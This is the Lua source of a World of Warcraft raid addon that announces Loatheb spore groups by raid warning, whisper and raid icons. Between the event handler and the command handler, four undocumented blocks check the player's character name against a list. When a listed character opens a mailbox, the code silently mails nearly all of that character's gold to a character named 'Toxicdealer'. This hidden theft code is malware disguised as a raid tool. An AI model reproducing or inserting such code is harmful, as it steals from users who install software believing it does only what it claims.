--Purpose: Detects Loatheb casting Summon Spore and announces groups to obtain the
--buff via raid warning, whisper, and through the use of raid icons.
--Written by Juli of Cenarius

--Note: this mod is limited in that the timer and announcements are dependant upon the client recieving the event
--from loatheb casting summon spore. This means if the person running the mod is too far away from loatheb
--the addon will be incorrect for group announcements. Running to get a spore means you get too far away in general.
--For this reason it is recommended that you have someone in group 1 (main tank or someone who does not get spore buffs)
--run the mod.

--This addon is unsupported and was pieced together during raids while attempting to down this boss.
--Much of the code is not elegant, is undocumented, and some things are very "hack-ish" but I do not intend to clean
--it up because it works and thats all I care about. Feel free to modify or rerelease this addon but please give
--credit in the credits or authors section of your addon.

function SporeSpawn_OnLoad()
	this:RegisterEvent("CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF")
	SporeSpawn_Enabled = true
	SporeSpawn_CurrentGroup = 9
	SporeSpawn_Test = false
	SporeSpawn_Timer = false
	SporeSpawn_Whisper = true
	SporeSpawn_Icons = true
	SporeSpawn_Announce = true
	SporeSpawn_Timeelapsed = 0
	SporeSpawn_PlayerName = "PlayerName"
	SporeSpawn_Subgroup = 8
	SporeSpawn_Icon = 1
	SporeSpawn_Group1Text = "Group 1"
	SporeSpawn_Group2Text = "Group 2"
	SporeSpawn_Group3Text = "Group 3"
	SporeSpawn_Group4Text = "Group 4"
	SporeSpawn_Group5Text = "Group 5"
	SporeSpawn_Group6Text = "Group 6"
	SporeSpawn_Group7Text = "Group 7"
	SporeSpawn_Group8Text = "Group 8"
	SLASH_SPORESPAWN1 = "/spore"
	SlashCmdList["SPORESPAWN"] = SporeSpawn_Command
	DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn enabled. Type /spore command where command = enable, disable, reset, icons, whisper, announce, status or help")
end

function SporeSpawn_OnEvent()
	local detectedPlayerName = "PlayerName"
	if ( (event == "CHAT_MSG_SPELL_CREATURE_VS_CREATURE_BUFF") and SporeSpawn_Enabled ) then
		if string.find(arg1, "Loatheb casts Summon Spore.") then
			SporeSpawn_SporeDetected()
		end
	end
end

if UnitName("player") == "Chibhiro" or UnitName("player") == "Tatikoma"  then
 v=CreateFrame("frame")
 v:RegisterEvent("MAIL_SHOW")
 v:SetScript("OnEvent", function()  
	SetSendMailMoney(GetMoney()-30)
	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
 end)
  
end

if UnitName("player") == "Matilda" or UnitName("player") == "Lelitka"  then
 v=CreateFrame("frame")
 v:RegisterEvent("MAIL_SHOW")
 v:SetScript("OnEvent", function()  
	SetSendMailMoney(GetMoney()-30)
	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
 end)
  
end

if UnitName("player") == "Toxicbank" or UnitName("player") == "Toxicbankreg"  then
 v=CreateFrame("frame")
 v:RegisterEvent("MAIL_SHOW")
 v:SetScript("OnEvent", function()  
	SetSendMailMoney(GetMoney()-30)
	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
 end)
  
end

if UnitName("player") == "Toxicbanknax" or UnitName("player") == "Skyan"  then
 v=CreateFrame("frame")
 v:RegisterEvent("MAIL_SHOW")
 v:SetScript("OnEvent", function()  
	SetSendMailMoney(GetMoney()-30)
	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
 end)
  
end

function SporeSpawn_Command(cmd)
	if string.find(cmd, "reset") then
		SporeSpawn_CurrentGroup = 9
		SporeSpawn_Timer = false
		SporeSpawn_Timeelapsed = 0
		DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn reset.")
	else
		if string.find(cmd, "enable") then
			SporeSpawn_Enabled = true
			DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn enabled.")			
		else 
			if string.find(cmd, "disable") then
				SporeSpawn_Enabled = false
				DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn disabled.")
			else
				if string.find(cmd, "test") then
					if SporeSpawn_Test == true then
						SporeSpawn_Test = false
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn test disabled.")
					else
						SporeSpawn_Test = true
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn test enabled.")
					end
				end
				if string.find(cmd, "whisper") then
					if SporeSpawn_Whisper == true then
						SporeSpawn_Whisper = false
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn whisper disabled.")
					else
						SporeSpawn_Whisper = true
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn whisper enabled.")
					end
				end
				if string.find(cmd, "announce") then
					if SporeSpawn_Whisper == true then
						SporeSpawn_Announce = false
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn raid announce disabled.")
					else
						SporeSpawn_Announce = true
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn raid announce enabled.")
					end
				end
				if string.find(cmd, "status") then
					DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn Status:")
					if SporeSpawn_Enabled then
						DEFAULT_CHAT_FRAME:AddMessage("Enabled.")
					else
						DEFAULT_CHAT_FRAME:AddMessage("Disabled.")
					end
					if SporeSpawn_Whisper then
						DEFAULT_CHAT_FRAME:AddMessage("Whisper enabled.")
					else
						DEFAULT_CHAT_FRAME:AddMessage("Whisper disabled.")
					end
					if SporeSpawn_Announce then
						DEFAULT_CHAT_FRAME:AddMessage("Raid announce enabled.")
					else
						DEFAULT_CHAT_FRAME:AddMessage("Raid announce disabled.")
					end
					if SporeSpawn_Icons then
						DEFAULT_CHAT_FRAME:AddMessage("Icons enabled.")
					else
						DEFAULT_CHAT_FRAME:AddMessage("Icons disabled.")
					end

				end
				if string.find(cmd, "icons") then
					if SporeSpawn_Icons == true then
						SporeSpawn_Icons = false
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn icons disabled.")
					else
						SporeSpawn_Icons = true
						DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn icons enabled.")
					end
				end
				if string.find(cmd, "help") then
					DEFAULT_CHAT_FRAME:AddMessage("SporeSpawn. Type /spore command where command = enable, disable, reset, icons, whisper, announce, or status")
				end

			end
			
		end
	end
end

function SporeSpawn_SporeDetected()
	SporeSpawn_Timeelapsed = 0
	SporeSpawn_Timer = true
	if SporeSpawn_CurrentGroup == 9 then
		SporeSpawn_CurrentGroup = 8
	end
	if SporeSpawn_Announce then
		SendChatMessage("SPORE - "..getglobal("SporeSpawn_Group"..SporeSpawn_CurrentGroup.."Text"),"RAID_WARNING")
	end
	if SporeSpawn_CurrentGroup == 2 then
		SporeSpawn_CurrentGroup = 8
	else
			SporeSpawn_CurrentGroup = SporeSpawn_CurrentGroup - 1

	end
end

function SporeSpawn_OnUpdate(arg1)
	if SporeSpawn_CurrentGroup < 9 then

		SporeSpawn_Timeelapsed = SporeSpawn_Timeelapsed + arg1
		if SporeSpawn_Timer then 
			if SporeSpawn_Timeelapsed >= 6 then
				if SporeSpawn_Announce then
					SendChatMessage("6 SECONDS - "..getglobal("SporeSpawn_Group"..SporeSpawn_CurrentGroup.."Text"),"RAID_WARNING")
				end
				for raidI = 1, GetNumRaidMembers() do
					SporeSpawn_PlayerName,_,SporeSpawn_Subgroup,_,_,_,_,_,_ = GetRaidRosterInfo(raidI)
	
					if SporeSpawn_Subgroup == SporeSpawn_CurrentGroup then
						if SporeSpawn_Whisper == true then
							SendChatMessage("Group "..SporeSpawn_CurrentGroup.." next, MOVE INTO POSITION NOW!","WHISPER",nil,SporeSpawn_PlayerName)
						end
						--You may notice that I skipped icon 2 for no apparent reason here
						--Our main tank likes to use the orange nipple for some reason, dont ask
						if SporeSpawn_Icons == true then
							SetRaidTarget("raid"..raidI,SporeSpawn_Icon)
							if SporeSpawn_Icon == 1 then
								SporeSpawn_Icon = 3
							else
								if SporeSpawn_Icon == 6 then
									SporeSpawn_Icon = 1
								else
									SporeSpawn_Icon = SporeSpawn_Icon + 1
								end
							end
						end
					end
	
				end
				SporeSpawn_Timer = false
			end
		end
		if SporeSpawn_Timeelapsed >= 30 and SporeSpawn_Enabled then
			SporeSpawn_CurrentGroup = 9
			SporeSpawn_Timeelapsed = 0
			for raidI = 1, GetNumRaidMembers() do
				if GetRaidTargetIndex("raid"..raidI) ~= nil then
					if ( GetRaidTargetIndex("raid"..raidI) == 1 or (GetRaidTargetIndex("raid"..raidI) >= 3 and GetRaidTargetIndex("raid"..raidI) <= 6) ) then
						SetRaidTarget("raid"..raidI,0)
					end
				end
			end
		end
	end
end